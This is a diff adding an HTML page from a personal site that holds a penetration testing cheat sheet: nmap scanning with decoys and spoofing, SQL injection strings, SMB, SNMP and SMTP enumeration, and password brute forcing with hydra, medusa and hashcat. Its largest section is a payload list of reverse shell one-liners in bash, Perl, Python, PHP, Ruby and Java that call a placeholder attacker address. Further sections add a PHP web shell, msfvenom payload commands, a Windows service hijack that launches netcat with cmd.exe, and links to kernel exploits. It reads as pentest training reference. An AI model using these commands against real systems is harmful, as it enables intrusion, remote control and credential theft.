@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="description" content="">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+
+<!-- Title -->
+<title>Gandosha - Autodidacticism.</title>
+
+<!-- Favicon -->
+<link rel="icon" href="img/core-img/favicon.ico">
+
+<!-- Core Stylesheet -->
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+<!-- Preloader -->
+<div id="preloader">
+<div class="loader"></div>
+</div>
+
+<div class="vcard-main-wrapper">
+<div class="vcard-content-wrapper bg-img" style="background-image: url(img/bg-img/bgssss.jpg);">
+<!-- Header Area -->
+<header class="header_area">
+<!-- Logo -->
+<div class="logo d-flex justify-content-center align-items-center">
+<a href="index-horizontal-about.html"><img src="img/core-img/logo3.png" alt=""></a>
+<!-- Navbar Toggle -->
+<div class="nav-toggle">
+<i class="fa fa-bars"></i>
+</div>
+</div>
+
+<!-- Menu -->
+<ul class="vcard-nav">
+<li><a href="https://github.com/Gandosha" data-toggle="tooltip" data-placement="top" title="Github"><i class="fa fa-fw fa-github" aria-hidden="true"></i></a></li>
+<li><a href="index.html">About</a></li>
+<li><a href="walkthroughs.html">CTF Walkthroughs</a></li>
+<li class="active"><a href="cheatsheets.html">Cheat Sheets</a></li>
+</ul>
+</header>
+
+<!-- Vcard Page Content -->
+<div class="vcard-page-content-wrapper d-flex align-items-end">
+<div class="page-content">
+
+<!-- ##### VM Title and link ##### -->
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+<div class="row align-items-end">
+<div class="about-me-text">
+<hr>
+<p><h2>Penetration Testing Cheat Sheet</h2>
+<br>
+<br>
+<br>
+<br>
+<hr>
+<p><h3>Nmap basic scans</h3></p>
+<pre style="background-color:black;color:white;">
+nmap -sn [IP_ADDRESS]/24    (Identify targets in subnet)
+nmap -sS -p- -T4 -Pn -vv [IP_ADDRESS]    (TCP scan)
+nmap -sU -p- -T4 -Pn -vv [IP_ADDRESS]    (UDP scan)
+nc -nv [IP_ADDRESS] [PORT_NUM]     (Grab banners manually for more clarity) 
+--source-port [PORT_NUM] // -S [IP_ADDRESS]    (Spoof)
+nmap -sS -sV -Pn -T4 -vv -D [FAKE_IP_ADDRESS] [TARGET]     (TCP Decoy) 
+nmap -sU -sV -Pn -T4 -vv -D [FAKE_IP_ADDRESS] [TARGET]     (UDP Decoy)
+
+Refer to https://nmap.org/book/man-bypass-firewalls-ids.html in order to evade firewall.
+</pre>
+<hr>
+<p><h3>Nmap script and vulnerability scan</h3></p>
+<pre style="background-color:black;color:white;">
+nmap -Pn -sV -A -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln [IP_ADDRESS]
+</pre>
+<hr>
+<p><h3>Any web port(s) for further enumeration?</h3></p>
+<p><font size="3.5" color="black">Fuzz directories (HTTP/HTTPS) using ZAP  (/usr/share/secLists/Discovery folder that has some great wordlists for this)</font></p>
+<hr>
+<p><h3>Manual Poking for Web Pages</h3></p>
+<p><font size="3.5" color="black">- Check the Page Source, Inspect elements, view cookies, tamper data, use curl/wget (Use ZAP ;) )</font></p>
+<p><font size="3.5" color="black">- Search repository online (like GitHub) if the application used is open source: this may assist in site enumeration and guessing versions etc.!</font></p>
+<p><font size="3.5" color="black">- Check HTTP Options</font></p>
+<p><font size="3.5" color="black">- Check for Input Validation in forms (like: 1′ or 1=1 limit 1;#   AND   1′ or 1=1–)</font></p>
+<pre style="background-color:black;color:white;">
+NULL or null	(Possible error messages returned)
+‘ , ” , ; , <!	(Breaks an SQL string or query; used for SQL, XPath and XML Injection tests)
+– , = , + , ”	(Used to craft SQL Injection queries)
+‘ , &, ! , ¦ , < , >	(Used to find command execution vulnerabilities)
+../	(Directory Traversal Vulnerabilities)
+</pre>
+<p><font size="3.5" color="black">- Wordpress?</font></p>
+<pre style="background-color:black;color:white;">
+wpscan --url [URL] --enumerate ap	(Enum plugins)
+wpscan --url [URL] --enumerate u	(Enum users)
+</pre>
+<hr>
+<p><h3>Are there any NETBIOS, SMB, RPC ports discovered?</h3></p>
+<pre style="background-color:black;color:white;">
+enum4linux -a [IP_ADDRESS] (For more info - https://labs.portcullis.co.uk/tools/enum4linux/)
+rpcclient [IP_ADDRESS] -U “” -N (For more info - https://attackerkb.com/Windows/rpcclient)
+rpcinfo -p [IP_ADDRESS]	(rpcinfo: What services are running?)
+</pre>
+<p><font size="3.5" color="black">Is portmapper running? Is rlogin running? Or NFS or Mountd? - http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/</font></p>
+<pre style="background-color:black;color:white;">
+showmount -e [IP_ADDRESS]/[port]
+</pre>
+<p><font size="3.5" color="black">Can you mount the smb share locally?</font></p>
+<pre style="background-color:black;color:white;">
+mount -t cifs //[IP_ADDRESS]/[SHARE] [LOCAL_DIR] -o username=”guest”,password=””
+rlogin [IP_ADDRESS]
+smbclient -L \\[IP_ADDRESS] -U “” -N
+nbtscan -r [IP_ADDRESS]
+net use \\[IP_ADDRESS]\$Share “” /u:””
+net view \\[IP_ADDRESS]
+</pre>
+<hr>
+<p><h3>Any SMTP ports available?</h3></p>
+<pre style="background-color:black;color:white;">
+smtp-user-enum -M VRFY -U [WORDLIST_PATH] -t [IP_ADDRESS]	(verify if username exists)
+smtp-user-enum -M EXPN -U [WORDLIST_PATH] -t [IP_ADDRESS]	(verify if username is valid)
+</pre>
+<p><font size="3.5" color="black">* Recommended wordlists at /usr/share/metasploit-framework/data/wordlists & /usr/share/seclists/Usernames (Kali)</font></p>
+<hr>
+<p><h3>How about SNMP ports?</h3></p>
+<pre style="background-color:black;color:white;">
+Default Community Names: public, private, cisco, manager
+
+Enumerate MIB:
+
+1.3.6.1.2.1.25.1.6.0 System Processes
+
+1.3.6.1.2.1.25.4.2.1.2 Running Programs
+
+1.3.6.1.2.1.25.4.2.1.4 Processes Path
+
+1.3.6.1.2.1.25.2.3.1.4 Storage Units
+
+1.3.6.1.2.1.25.6.3.1.2 Software Name
+
+1.3.6.1.4.1.77.1.2.25 User Accounts
+
+1.3.6.1.2.1.6.13.1.3 TCP Local Ports
+
+
+onesixtyone – c [COMMUNITY_ LIST_FILE] -I [IP_ADDRESS]
+onmpwalk -c [COMMUNITY_STRING] -v[VERSION] [IP_ADDRESS]
+root@kali:~# snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2	(Eg: enumerating running processes)
+</pre>
+<hr>
+<p><h3>FTP ports discovered?</h3></p>
+<p><font size="3.5" color="black">Is anonymous login allowed?
+If yes, is directory listing possible? Can a file be ‘get’ or ‘send’?</font></p>
+<pre style="background-color:black;color:white;">
+ftp [IP_ADDRESS]
+</pre>
+<hr>
+<p><h3>Password Cracking / Brute Forcing</h3></p>
+<p><font size="3.5" color="black">Try this as the last resort or in case the Passwd/Shadow/SAM files are in possession:
+For linux, first combine passwd & shadow files:  unshadow [PASSWD_FILE] [SHADOW_FILE] > unshadowed.txt
+Then, use John on the unshadowed file using a wordlist or rules mangling : john –rules –wordlist=[WORDLIST_FILE] unshadowed.txt
+Identifying Hash: hash-identifier
+For other services, use Medusa or Hydra. Eg:</font></p>
+<pre style="background-color:black;color:white;">
+hydra -L [USERNAME_FILE] -P [PASSWORD_FILE] -v [IP_ADDRESS] ssh
+medusa -h [IP_ADDRESS] -U [USERNAME_FILE] -P PASSWORD_FILE] -M http -m DIR:/admin -T 30
+</pre>
+<p><font size="3.5" color="black">Using hashcat for cracking hashes:</font></p>
+<pre style="background-color:black;color:white;">
+hashcat -m 400 -a 0 [HASH_FILE] [WORDLIST_FILE]
+</pre>
+<hr>
+<p><h3>Packet Sniffing</h3></p>
+<p><font size="3.5" color="black">Use Wireshark / tcpdump to capture traffic on the target host:</font></p>
+<pre style="background-color:black;color:white;">
+tcpdump -i tap0 host [IP_ADDRESS] tcp port 80 and not arp and not icmp -vv
+</pre>
+<hr>
+<p><h3>SSH</h3></p>
+<p><font size="3.5" color="black">https://www.digitalocean.com/community/tutorials/ssh-essentials-working-with-ssh-servers-clients-and-keys
+</font></p>
+<hr>
+<p><h3>Payload Generation</h3></p>
+<p><font size="3.5" color="black">Payload list:</font></p>
+<pre style="background-color:black;color:white;">msfvenom -l</pre>
+<p><font size="3.5" color="black">Bash</font></p>
+<pre style="background-color:black;color:white;">
+bash -i >& /dev/tcp/[ATTACKER's_IP_ADDRESS]/[ATTACKER's_PORT] 0>&1	(reverse shell)
+msfvenom -p cmd/unix/reverse_bash LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.sh	(reverse shell using msfvenom)
+</pre>
+<p><font size="3.5" color="black">Perl</font></p>
+<pre style="background-color:black;color:white;">
+perl -e 'use Socket;$i="[ATTACKER's_IP_ADDRESS]";$p=[ATTACKER's_PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'	(reverse shell)
+msfvenom -p cmd/unix/reverse_perl LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.pl	(reverse shell using msfvenom)
+</pre>
+<p><font size="3.5" color="black">Python</font></p>
+<pre style="background-color:black;color:white;">
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ATTACKER's_IP_ADDRESS]",[ATTACKER's_PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'	(reverse shell)
+msfvenom -p cmd/unix/reverse_python LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.py	(reverse shell using msfvenom)
+</pre>
+<p><font size="3.5" color="black">PHP</font></p>
+<pre style="background-color:black;color:white;">
+php -r '$sock=fsockopen("[ATTACKER's_IP_ADDRESS]",[ATTACKER's_PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'	(reverse shell)
+<?php echo shell_exec($_GET[‘cmd’]);?>	(invoke cmd - usage: [URL]?cmd=[COMMAND])
+msfvenom -p php/meterpreter_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.php && echo '<?php ' | cat - shell.php > temp && mv temp shell.php && echo '?>' >> shell.php	(reverse shell using msfvenom)
+</pre>
+<p><font size="3.5" color="black">ASP</font></p>
+<pre style="background-color:black;color:white;">
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.jsp	(reverse shell using msfvenom)
+</pre>
+<p><font size="3.5" color="black">WAR</font></p>
+<pre style="background-color:black;color:white;">
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f war > shell.war	(reverse shell using msfvenom)
+</pre>
+<p><font size="3.5" color="black">JSP</font></p>
+<pre style="background-color:black;color:white;">
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f asp > shell.asp	(reverse shell using msfvenom)
+</pre>
+<p><font size="3.5" color="black">Ruby</font></p>
+<pre style="background-color:black;color:white;">
+ruby -rsocket -e'f=TCPSocket.open("[ATTACKER's_IP_ADDRESS]",[ATTACKER's_PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'	(reverse shell)
+msfvenom -p cmd/unix/reverse_python LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.py	(reverse shell using msfvenom)
+</pre>
+<p><font size="3.5" color="black">Java</font></p>
+<pre style="background-color:black;color:white;">
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[ATTACKER's_IP_ADDRESS]/[ATTACKER's_PORT];cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()	(reverse shell)
+</pre>
+<p><font size="3.5" color="black">Linux</font></p>
+<pre style="background-color:black;color:white;">
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f elf > shell.elf	(reverse shell using msfvenom)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f [LANGUAGE]	(reverse shell using msfvenom - shellcode)
+</pre>
+<p><font size="3.5" color="black">Windows</font></p>
+<pre style="background-color:black;color:white;">
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f exe > shell.exe	(reverse shell using msfvenom)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f [LANGUAGE]		(reverse shell using msfvenom - shellcode)	
+
+</pre>
+<p><font size="3.5" color="black">Mac</font></p>
+<pre style="background-color:black;color:white;">
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] PORT=[ATTACKER's_PORT] -f macho > shell.macho	(reverse shell using msfvenom)
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f [LANGUAGE]		(reverse shell using msfvenom - shellcode)
+</pre>
+<p><font size="3.5" color="black">MSF handler</font></p>
+<pre style="background-color:black;color:white;">
+msfconsole -x "use exploit/multi/handler;set LHOST [ATTACKER's_IP_ADDRESS];set LPORT [ATTACKER's_PORT];set PAYLOAD [PAYLOAD];run"
+</pre>
+<hr>
+<p><h3>TTY Shells</h3></p>
+<p><font size="3.5" color="black">Spawn a TTY shell from a limited shell in Linux, useful for running commands like su from reverse shells.</font></p>
+<p><font size="3.5" color="black">Python TTY Shell Trick</font></p>
+<pre style="background-color:black;color:white;">
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+</pre>
+<p><font size="3.5" color="black">Spawn Interactive sh shell</font></p>
+<pre style="background-color:black;color:white;">
+/bin/sh -i
+</pre>
+<p><font size="3.5" color="black">Spawn Perl TTY Shell</font></p>
+<pre style="background-color:black;color:white;">
+exec "/bin/sh";
+perl —e 'exec "/bin/sh";'
+</pre>
+<p><font size="3.5" color="black">Spawn Ruby TTY Shell</font></p>
+<pre style="background-color:black;color:white;">
+exec "/bin/sh"
+</pre>
+<p><font size="3.5" color="black">Spawn Lua TTY Shell</font></p>
+<pre style="background-color:black;color:white;">
+os.execute('/bin/sh')
+</pre>
+<p><font size="3.5" color="black">Spawn TTY Shell from Vi</font></p>
+<pre style="background-color:black;color:white;">
+:!bash
+</pre>
+<p><font size="3.5" color="black">Spawn TTY Shell NMAP --interactive</font></p>
+<pre style="background-color:black;color:white;">
+!sh
+</pre>
+<hr>
+<p><h3>Privilege Escalation</h3></p>
+<p><font size="3.5" color="black">Windows:</font></p>
+<p><font size="3.5" color="black">- http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation</font></p>
+<p><font size="3.5" color="black">- http://www.fuzzysecurity.com/tutorials/16.html</font></p>
+<pre style="background-color:black;color:white;">
+accesschk.exe /accepteula (first thing to do in CLI access)
+accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
+accesschk.exe /accepteula -ucqv [SERVICE_NAME]
+sc qc [SERVICE_NAME]
+sc config [SERVICE_NAME] binpath= "C:\[NC.EXE_PATH] -nv [LHOST] [LPORT] -e C:\WINDOWS\System32\cmd.exe"
+sc config [SERVICE_NAME] obj= ".\LocalSystem" password= ""
+sc config [SERVICE_NAME] start= auto
+net start [SERVICE_NAME]
+</pre>
+<p><font size="3.5" color="black">Linux:</font></p>
+<p><font size="3.5" color="black">LinEnum - 
+http://www.rebootuser.com/?p=1758
+This tool is great at running through a heap of things you should check on a Linux system in the post exploit process. This include file permissions, cron jobs if visible, weak credentials etc. The first thing I run on a newly compromised system.</font></p>
+<p><font size="3.5" color="black">LinuxPrivChecker - 
+http://www.securitysift.com/download/linuxprivchecker.py
+This is a great tool for once again checking a lot of standard things like file permissions etc. The real gem of this script is the recommended privilege escalation exploits given at the conclusion of the script. This is a great starting point for escalation.</font></p>
+<p><font size="3.5" color="black">What's the distribution type? What version?</font></p>
+<pre style="background-color:black;color:white;">
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release      # Debian based
+cat /etc/redhat-release   # Redhat based
+</pre>
+<p><font size="3.5" color="black">What's the kernel version? Is it 64-bit?</font></p>
+<pre style="background-color:black;color:white;">
+cat /proc/version
+uname -a
+uname -mrs
+rpm -q kernel
+dmesg | grep Linux
+ls /boot | grep vmlinuz-
+</pre>
+<p><font size="3.5" color="black">What can be learnt from the environmental variables?</font></p>
+<pre style="background-color:black;color:white;">
+cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+</pre>
+<p><font size="3.5" color="black">Is there a printer?</font></p>
+<pre style="background-color:black;color:white;">
+lpstat -a
+</pre>
+
+
+
+
+
+
+
+
+<hr>
+<p><h3>Are there any exploits available publicly from the services discovered?</h3></p>
+<pre style="background-color:black;color:white;">
+getsploit [VERSION]
+</pre>
+<p><font size="3.5" color="black">- Precompiled windows exploits - https://github.com/abatchy17/WindowsExploits</font></p>
+<p><font size="3.5" color="black">- Windows kernel exploits - https://github.com/SecWiki/windows-kernel-exploits</font></p>
+<p><font size="3.5" color="black">- Linux kernel exploits - https://github.com/SecWiki/linux-kernel-exploits</font></p>
+<p><font size="3.5" color="black">- http://1337day.com</font></p>
+<p><font size="3.5" color="black">- http://www.securiteam.com</font></p>
+<p><font size="3.5" color="black">- http://www.securityfocus.com</font></p>
+<p><font size="3.5" color="black">- http://www.exploitsearch.net</font></p>
+<p><font size="3.5" color="black">- http://metasploit.com/modules/</font></p>
+<p><font size="3.5" color="black">- http://securityreason.com</font></p>
+<p><font size="3.5" color="black">- http://seclists.org/fulldisclosure/</font></p>
+<p><font size="3.5" color="black">- http://www.google.com</font></p>
+
+
+<p><h3>Other (quick) guides & Links</h3></p>
+<p><font size="3.5" color="black">Decrypting TLS Browser Traffic With Wireshark - https://jimshaver.net/2015/02/11/decrypting-tls-browser-traffic-with-wireshark-the-easy-way/</font></p>
+<p><font size="3.5" color="black">Enumeration - http://www.0daysecurity.com/penetration-testing/enumeration.html</font></p>
+<p><font size="3.5" color="black">Misc - http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf</font></p>
+<p><font size="3.5" color="black">Misc - http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html</font></p>
+<hr>
+</div>
+</div>
+
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+
+
+
+
+
+<!-- ##### All Javascript Files ##### -->
+<!-- jQuery-2.2.4 js -->
+<script src="js/jquery/jquery-2.2.4.min.js"></script>
+<!-- Popper js -->
+<script src="js/bootstrap/popper.min.js"></script>
+<!-- Bootstrap js -->
+<script src="js/bootstrap/bootstrap.min.js"></script>
+<!-- All Plugins js -->
+<script src="js/plugins/plugins.js"></script>
+<!-- Active js -->
+<script src="js/active.js"></script>
+
+</body>
+
+</html>
